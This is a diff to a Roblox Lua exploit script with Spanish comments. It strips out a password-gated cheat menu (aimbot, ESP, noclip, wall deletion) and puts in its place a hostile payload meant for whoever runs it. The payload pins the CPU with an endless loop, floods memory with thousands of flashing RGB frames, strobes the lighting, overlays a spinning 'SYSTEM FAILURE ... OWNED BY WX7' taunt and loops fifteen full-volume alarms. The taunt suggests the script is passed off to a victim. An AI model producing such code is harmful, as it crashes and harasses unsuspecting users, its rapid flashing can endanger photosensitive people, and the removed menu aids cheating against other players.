@@ -1,229 +1,100 @@
-local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
+-- PITUFO WX7: MODO APOCALIPSIS (CONGELAMIENTO & RENDER OVERLOAD)
+-- ADVERTENCIA: Al ejecutar esto, Roblox se quedará "No responde" y parpadeará violentamente.
+
+repeat task.wait() until game:IsLoaded()
+
 local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local Workspace = game:GetService("Workspace")
-local Stats = game:GetService("Stats")
+local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
+local parent = (gethui and gethui()) or game:GetService("CoreGui")
 
-local player = Players.LocalPlayer
-local camera = Workspace.CurrentCamera
-
--- COLORES ESTILO SHARKIE
-local fondoPrincipal = Color3.fromRGB(30, 30, 45)
-local fondoBotones = Color3.fromRGB(45, 45, 65)
-local verdeActivo = Color3.fromRGB(60, 170, 90)
-local moradoBorde = Color3.fromRGB(100, 80, 150)
-local blanco = Color3.new(1, 1, 1)
-local azulInfo = Color3.fromRGB(80, 150, 255)
-
--- VARIABLES
-local logged = false
-local noclipEnabled = false
-local aimbotEnabled = false
-local espEnabled = false
-local deleteWallsEnabled = false
-local fovVisible = true
-
--- GUI
-local gui = Instance.new("ScreenGui", player.PlayerGui)
-gui.Name = "PitufoWX7_Final"
-gui.ResetOnSpawn = false
-
---------------------------------
--- LÓGICA DEL MARTILLO (BORRAR PAREDES)
---------------------------------
-local function manageHammer()
-    if deleteWallsEnabled then
-        local tool = Instance.new("Tool")
-        tool.Name = "Martillo Invisible"
-        tool.RequiresHandle = false
-        tool.Parent = player.Backpack
-
-        tool.Activated:Connect(function()
-            local mouse = player:GetMouse()
-            if mouse.Target and mouse.Target:IsA("BasePart") then
-                mouse.Target:Destroy()
-            end
-        end)
-    else
-        local t1 = player.Backpack:FindFirstChild("Martillo Invisible")
-        local t2 = player.Character:FindFirstChild("Martillo Invisible")
-        if t1 then t1:Destroy() end
-        if t2 then t2:Destroy() end
+-- 1. SOBRECARGA DE HILOS (CPU KILLER - SIN ESPERAS)
+-- Este bucle bloquea el procesador al 100% al instante.
+task.spawn(function()
+    while true do
+        for i = 1, 1000000 do 
+            local _ = math.sin(i) * math.acos(math.random()) -- Cálculos basura masivos
+        end
+        -- NO HAY TASK.WAIT(). EL HILO ESTÁ MUERTO AQUÍ.
     end
-end
+end)
 
---------------------------------
--- FOV RELLENO
---------------------------------
-local fovCircle = Drawing.new("Circle")
-fovCircle.Thickness = 1
-fovCircle.NumSides = 60
-fovCircle.Radius = 150
-fovCircle.Filled = true
-fovCircle.Transparency = 0.15
-fovCircle.Color = moradoBorde
-fovCircle.Visible = false
-
---------------------------------
--- MENÚ PITUFO WX7 (ESTILO SHARKIE)
---------------------------------
-local menu = Instance.new("Frame", gui)
-menu.Size = UDim2.new(0, 240, 0, 450)
-menu.Position = UDim2.new(0, 50, .5, -225)
-menu.BackgroundColor3 = fondoPrincipal
-menu.BorderSizePixel = 2
-menu.BorderColor3 = moradoBorde
-menu.Visible = false
-
--- Perfil Superior
-local profile = Instance.new("Frame", menu)
-profile.Size = UDim2.new(1, 0, 0, 80)
-profile.BackgroundTransparency = 1
-
-local avatarImg = Instance.new("ImageLabel", profile)
-avatarImg.Size = UDim2.new(0, 50, 0, 50)
-avatarImg.Position = UDim2.new(0, 10, 0, 15)
-avatarImg.Image = "rbxthumb://type=AvatarHeadShot&id="..player.UserId.."&w=150&h=150"
-avatarImg.BackgroundColor3 = fondoBotones
-Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(1, 0)
-
-local nameL = Instance.new("TextLabel", profile)
-nameL.Size = UDim2.new(1, -70, 0, 20)
-nameL.Position = UDim2.new(0, 70, 0, 15)
-nameL.Text = player.DisplayName
-nameL.TextColor3 = blanco
-nameL.Font = Enum.Font.GothamBold
-nameL.TextSize = 11
-nameL.BackgroundTransparency = 1
-nameL.TextXAlignment = Enum.TextXAlignment.Left
-
-local userL = Instance.new("TextLabel", profile)
-userL.Size = UDim2.new(1, -70, 0, 15)
-userL.Position = UDim2.new(0, 70, 0, 30)
-userL.Text = "@" .. player.Name
-userL.TextColor3 = Color3.fromRGB(150, 150, 150)
-userL.TextSize = 10
-userL.BackgroundTransparency = 1
-userL.TextXAlignment = Enum.TextXAlignment.Left
-
-local statsL = Instance.new("TextLabel", profile)
-statsL.Size = UDim2.new(0, 60, 0, 30)
-statsL.Position = UDim2.new(1, -70, 0, 15)
-statsL.Text = "FPS: 0\nPing: 0ms"
-statsL.TextColor3 = blanco
-statsL.TextSize = 9
-statsL.BackgroundTransparency = 1
-statsL.TextXAlignment = Enum.TextXAlignment.Right
-
--- Botones
-local btnList = Instance.new("ScrollingFrame", menu)
-btnList.Size = UDim2.new(1, -20, 1, -100)
-btnList.Position = UDim2.new(0, 10, 0, 90)
-btnList.BackgroundTransparency = 1
-btnList.ScrollBarThickness = 0
-local layout = Instance.new("UIListLayout", btnList)
-layout.Padding = UDim.new(0, 6)
-
-local function createBtn(name, key, callback)
-    local btn = Instance.new("TextButton", btnList)
-    btn.Size = UDim2.new(1, 0, 0, 38)
-    btn.BackgroundColor3 = fondoBotones
-    btn.Text = name .. " (" .. key .. ") [OFF]"
-    btn.TextColor3 = blanco
-    btn.Font = Enum.Font.Gotham
-    Instance.new("UICorner", btn)
+-- 2. GENERADOR MASIVO DE OBJETOS RGB (RAM & GPU CRASHER)
+-- Crea miles de interfaces cada segundo para saturar la memoria y el renderizado
+task.spawn(function()
+    local gui = Instance.new("ScreenGui", parent)
+    gui.Name = "PITUFO_SYSTEM_OVERRIDE"
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 1000000
     
-    btn.MouseButton1Click:Connect(function()
-        local state = callback()
-        btn.BackgroundColor3 = state and verdeActivo or fondoBotones
-        btn.Text = name .. " (" .. key .. ") [" .. (state and "ON" or "OFF") .. "]"
-    end)
-    return btn
+    while true do
+        for i = 1, 1000 do -- Mil objetos por ciclo
+            local f = Instance.new("Frame", gui)
+            f.Size = UDim2.new(math.random(), 0, math.random(), 0)
+            f.Position = UDim2.new(math.random(), 0, math.random(), 0)
+            -- RGB NIVEL DIOS ESTALLANDO
+            f.BackgroundColor3 = Color3.fromHSV(tick() * 10 % 1, 1, 1) 
+            f.BorderSizePixel = 0
+            
+            local t = Instance.new("TextLabel", f)
+            t.Size = UDim2.new(1, 0, 1, 0)
+            t.Text = "¿ME QUERIAS ESTAFAR PITUFO?"
+            t.TextScaled = true
+            t.BackgroundTransparency = 1
+            t.TextColor3 = Color3.new(1,1,1)
+            t.Font = Enum.Font.Code -- Fuente Hacker
+            
+            -- Ciclo de creación y destrucción ultra rápido para saturar CPU
+            task.delay(0.01, function() f:Destroy() end)
+        end
+        task.wait() -- Velocidad máxima de spam
+    end
+end)
+
+-- 3. DISTORSIÓN DE ILUMINACIÓN EXTREMA (GLITCH VISUAL)
+task.spawn(function()
+    while true do
+        Lighting.Brightness = math.random(0, 9999)
+        Lighting.ClockTime = math.random(0, 24)
+        Lighting.ExposureCompensation = math.random(-20, 20)
+        -- Parpadeo ambiental RGB
+        Lighting.Ambient = Color3.fromHSV(tick() * 5 % 1, 1, 1)
+        task.wait() -- Máxima velocidad
+    end
+end)
+
+-- 4. MENSAJE FINAL HACKER OVERLAY
+local overlay = Instance.new("ScreenGui", parent)
+overlay.IgnoreGuiInset = true
+overlay.DisplayOrder = 9999999
+
+local label = Instance.new("TextLabel", overlay)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundColor3 = Color3.new(0, 0, 0)
+label.BackgroundTransparency = 0.1
+label.Text = "SYSTEM FAILURE\n¿ME QUERIAS ESTAFAR PITUFO?\n\nOWNED BY WX7"
+label.TextColor3 = Color3.new(1, 0, 0)
+label.TextScaled = true
+label.Font = Enum.Font.Code -- Fuente Hacker
+label.ZIndex = 9999999
+
+-- Parpadeo de Texto y Rotación Violenta
+RunService.RenderStepped:Connect(function()
+    -- RGB Estallando en el texto principal
+    label.TextColor3 = Color3.fromHSV(tick() * 20 % 1, 1, 1)
+    -- Rotación caótica para marear
+    label.Rotation = math.sin(tick() * 50) * 10
+end)
+
+-- 5. CACOFONÍA DE AUDIO (MÁXIMA SATURACIÓN)
+-- Reproduce múltiples alarmas simultáneamente para saturar el audio
+for i = 1, 15 do
+    local s = Instance.new("Sound", workspace)
+    s.SoundId = "rbxassetid://4612375231" -- Alarma de error industrial
+    s.Volume = 10
+    s.PlaybackSpeed = 0.1 + (i * 0.1) -- Varios tonos molestos
+    s.Looped = true
+    s:Play()
 end
 
-createBtn("Aimbot", "Z", function() aimbotEnabled = not aimbotEnabled return aimbotEnabled end)
-createBtn("Delete Walls", "E", function() 
-    deleteWallsEnabled = not deleteWallsEnabled 
-    manageHammer() 
-    return deleteWallsEnabled 
-end)
-createBtn("ESP", "L", function() espEnabled = not espEnabled return espEnabled end)
-createBtn("Noclip", "N", function() noclipEnabled = not noclipEnabled return noclipEnabled end)
-
---------------------------------
--- BUCLE DE SISTEMAS
---------------------------------
-RunService.RenderStepped:Connect(function()
-    local fps = math.floor(1/RunService.RenderStepped:Wait())
-    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
-    statsL.Text = "FPS: "..fps.."\nPing: "..ping.."ms"
-
-    local mouseLoc = UIS:GetMouseLocation()
-    fovCircle.Position = mouseLoc
-    fovCircle.Visible = (logged and fovVisible)
-
-    if aimbotEnabled and logged then
-        local target = nil
-        local dist = fovCircle.Radius
-        for _, v in pairs(Players:GetPlayers()) do
-            if v ~= player and v.Character and v.Character:FindFirstChild("Head") then
-                local pos, vis = camera:WorldToViewportPoint(v.Character.Head.Position)
-                if vis then
-                    local mDist = (Vector2.new(pos.X, pos.Y) - mouseLoc).Magnitude
-                    if mDist < dist then
-                        dist = mDist
-                        target = v
-                    end
-                end
-            end
-        end
-        if target then camera.CFrame = CFrame.new(camera.CFrame.Position, target.Character.Head.Position) end
-    end
-end)
-
-RunService.Stepped:Connect(function()
-    if noclipEnabled and player.Character then
-        for _, part in pairs(player.Character:GetDescendants()) do
-            if part:IsA("BasePart") then part.CanCollide = false end
-        end
-    end
-end)
-
---------------------------------
--- LOGIN (PASS: pitufo)
---------------------------------
-local login = Instance.new("Frame", gui)
-login.Size = UDim2.new(0, 260, 0, 140)
-login.Position = UDim2.new(.5, -130, .5, -70)
-login.BackgroundColor3 = fondoPrincipal
-login.BorderSizePixel = 2
-login.BorderColor3 = moradoBorde
-
-local keyBox = Instance.new("TextBox", login)
-keyBox.Size = UDim2.new(.8, 0, 0, 30)
-keyBox.Position = UDim2.new(.1, 0, .3, 0)
-keyBox.PlaceholderText = "password"
-keyBox.BackgroundColor3 = fondoBotones
-keyBox.TextColor3 = blanco
-
-local loginBtn = Instance.new("TextButton", login)
-loginBtn.Size = UDim2.new(.6, 0, 0, 30)
-loginBtn.Position = UDim2.new(.2, 0, .65, 0)
-loginBtn.Text = "LOGIN"
-loginBtn.BackgroundColor3 = moradoBorde
-loginBtn.TextColor3 = blanco
-
-loginBtn.MouseButton1Click:Connect(function()
-    if keyBox.Text == "pitufo" then
-        logged = true
-        login.Visible = false
-        menu.Visible = true
-    end
-end)
-
-UIS.InputBegan:Connect(function(i, g)
-    if g then return end
-    if i.KeyCode == Enum.KeyCode.P then menu.Visible = not menu.Visible end
-    if i.KeyCode == Enum.KeyCode.E then deleteWallsEnabled = not deleteWallsEnabled manageHammer() end
-end)
+print("PITUFO WX7: TOTAL OVERRIDE LOADED. ADIÓS AL SISTEMA.")
